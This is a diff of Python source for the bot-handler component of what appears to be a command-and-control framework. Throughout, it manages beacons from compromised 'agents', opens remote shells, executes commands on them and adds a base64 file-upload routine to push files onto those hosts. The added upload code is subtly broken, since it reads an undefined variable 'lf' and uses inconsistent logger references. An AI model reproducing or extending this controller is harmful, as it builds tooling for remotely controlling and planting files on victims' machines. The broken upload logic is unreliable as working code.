@@ -142,7 +142,6 @@ class Handler(threading.Thread):
                     if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
                         self.status[1] = "UP"
                         loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - BEACON : UP')
-
                     else:
                         self.status[1] = "DOWN"
                         loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - BEACON : DOWN')
@@ -182,7 +181,7 @@ class Handler(threading.Thread):
 
     def getPort(self):
         return self.port
-
+#------------------------------------------------------------------------------------------------------------------------------
     def shell(self):
 
         self.beacon_wait = True
@@ -197,6 +196,8 @@ class Handler(threading.Thread):
             loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Unable to initiate shell interaction with agent '+str(self.bot_id))
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
+
+            self.beacon_wait = False
             return False                            # unsuccessful
         else:
 
@@ -294,7 +295,6 @@ class Handler(threading.Thread):
 
                             if not recv:
                                 break
-                            
                             else:
                                 cmd_response += recv
                     
@@ -320,13 +320,13 @@ class Handler(threading.Thread):
 
         self.beacon_wait = False
         return True
-
-
+#------------------------------------------------------------------------------------------------------------------------------
     def execute(self, cmd_sent, suppress=False):
+
+        self.beacon_wait = True
         if not suppress:
             # Log this
             print(f"[* BotHandler-Msg:StdExec] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")
-            # loggers[0].q_log('serv','info','[* BotHandler-Msg:StdExec] Received command: '+str(cmd_sent)+' for agent '+str(self.bot_id)+' at '+str(self.ip))
             loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Received command: '+str(cmd_sent)+' for agent '+str(self.bot_id)+' at '+str(self.ip))
 
         # Single instance execution
@@ -340,7 +340,8 @@ class Handler(threading.Thread):
             loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.bot_id))
             print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
             loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
-
+            
+            self.beacon_wait = False
             return "== Return Value Error =="
         else:
             cmd_response = ""
@@ -353,12 +354,12 @@ class Handler(threading.Thread):
                     # if timeout exception is triggered - assume no more data
                     recv = ""
                 except Exception as ex:
-                    if not suppress:
-                        # Log this
-                        print("[* BotHandler-Msg:StdExec] Unable to process received data.")
-                        loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to process received data from agent '+str(self.bot_id))
-                        print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
-                        loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
+                    # if not suppress:
+                    # Log this
+                    print("[* BotHandler-Msg:StdExec] Unable to process received data.")
+                    loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to process received data from agent '+str(self.bot_id))
+                    print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
+                    loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
 
                     break
 
@@ -366,11 +367,75 @@ class Handler(threading.Thread):
                     break
                 else:
                     cmd_response += recv
-            
+
+            self.beacon_wait = False
             return str(cmd_response)
+#------------------------------------------------------------------------------------------------------------------------------
+
     # TODO %%
     def download(self, remotepath, localfile):
         print("TBC")
+#------------------------------------------------------------------------------------------------------------------------------
 
-    def upload(self, localfile, remotepath):
-        print("TBC")
+    def upload(self, localfile, remotefile):
+
+        print(f"[* BotHandler-Msg:Upload] Attempting to upload {localfile} to remote file {remotefile} on agent {self.getID()}")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Attempting to upload '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
+
+        self.beacon_wait = True
+
+        try:
+            with open(lf,mode='rb') as file:
+                filedata = file.read()
+        except FileNotFoundError:
+            print(f"[* Interpreter-Msg:Upload] File {localfile} does not exist")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+str(localfile)+'" does not exist')
+
+            self.beacon_wait = False
+            return False
+        except Exception as ex:
+            print(f"[* Interpreter-Msg:Upload] Unable to read file '{localfile}' ")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to read file '+str(localfile))
+
+            self.beacon_wait = False
+            return False
+
+        # Encode file for upload
+        print(f"[* Interpreter-Msg:Upload] Encoding {localfile} to send to agent {self.getID()}")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Encoding '+str(localfile)+' to send to agent '+str(self.getID()))
+        b64filedata = base64.b64encode(filedata).decode('utf-8')
+        b64datalen = len(b64filedata)
+            
+        # This will send following data to agent:
+        # upload <remote-filename> <b64_size>
+
+        try:
+            self.execute('upload {} {}'.format(remotefile,b64datalen))
+        except Exception as ex:
+            print(f"[* Interpreter-Msg:Upload] Unable to send 'upload' initiation to agent {str(self.getID())}")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to send \'upload\' initiation to agent '+str(self.getID()))
+
+            self.beacon_wait = False
+            return False
+        else:
+            print(f"[* Interpreter-Msg:Upload] Upload of file {localfile} to {remotefile} initiated on agent {self.getID()}")
+            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Upload of file '+str(localfile)+' to remote file '+str(remotefile)+' initiated on agent '+str(self.getID()))
+            
+            # This will then send the file contents to the agent as its expecting
+            try:
+                time.sleep(0.7)
+                print(f"[* Interpreter-Msg:Upload] Attempting to send base64 encoded filedata of {localfile} to remote file {remotefile} on agent {self.getID()}")
+                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Attempting to send base64 encoded filedata of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
+                self.execute(b64filedata)
+                time.sleep(1.5)
+            except Exception as ex:
+                print(f"[* Interpreter-Msg:Upload] Unable to send encoded local file data to agent {str(self.getID())}")
+                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to send encoded local file data to agent '+str(self.getID()))
+
+                self.beacon_wait = False
+                return False
+        
+        print(f"[* Interpreter-Msg:Upload] Upload  of file {localfile} to remote file {remotefile} on agent {self.getID()} determined successful. Please verify with agent.")
+        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Upload of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID())+' determined successfule. Please verify with agent.')
+        self.beacon_wait = False
+        return True
